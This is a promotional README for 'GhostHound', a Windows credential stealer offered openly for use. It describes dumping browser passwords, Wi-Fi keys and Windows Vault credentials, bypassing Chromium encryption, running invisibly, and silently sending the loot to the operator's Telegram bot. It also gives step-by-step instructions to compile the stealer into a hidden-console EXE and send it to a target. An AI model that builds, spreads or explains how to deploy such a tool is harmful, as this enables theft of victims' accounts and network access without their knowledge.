👻 GhostHound Stealer

Version: 1.0Author: MR MONSIF H4CK3RPlatform: Windows OnlyLanguage: Python (compiled to EXE)Architecture: Silent Info Stealer

🧠 What is GhostHound?

GhostHound is a stealthy and effective post-access info stealer. It extracts sensitive data from compromised Windows machines and exfiltrates it instantly to your Telegram bot. It's built for speed, stealth, and total dominance.

🧬 Features

1 Wi-Fi Password Extractor – Gets all saved SSIDs + their keys.

2 Google Chrome Password Dump – Grabs all saved credentials.

3 Microsoft Edge Password Dump – Full browser support.

4 Windows Credential Vault Access – Harvests stored credentials.

5 One-Click Execution – No setup, no questions, just fire.

6 Telegram Auto Send – Instantly pushes loot to your bot.

7 AES-GCM Decryption – Fully bypasses Chromium encryption.

8 EXE Packed – Single file with custom icon, invisible execution.

⚙️ How It Works

User runs the EXE.

Extracts Chrome, Edge, Wi-Fi, and Windows Vault credentials.

Generates a full HTML report.

Sends the report silently to Telegram via your bot.

Self-destruct or exit silently.

🔥 Usage

Clone or download this repo.

Customize the BOT_TOKEN and CHAT_ID in the script.

Compile using:

pyinstaller --noconsole --onefile --icon=icon.ico stealer.py

Send stealer.exe to the target.

Once they execute, you'll receive a full report via Telegram.

🧠 Requirements

Python 3.10+

pycryptodome, pywin32, requests

Install them using:

pip install -r requirements.txt

⚔️ Example Output

You'll receive a clean, structured HTML report including:

Site URLs

Usernames

Passwords

Wi-Fi SSIDs & keys

Windows logins

All of it, straight in your private Telegram.

💀 Final Words

This is not for script kiddies, bounty hunters, or CTF nerds.

This is for operators. No GUI, no noise, no mercy.

🖤 No rules

🖤 No logs

🖤 No warnings

You run it, it delivers.

🧠 Stay paranoid. Stay invisible.🎭 Built by @H4CK3R_MONSIF👑 Welcome to the black sector.
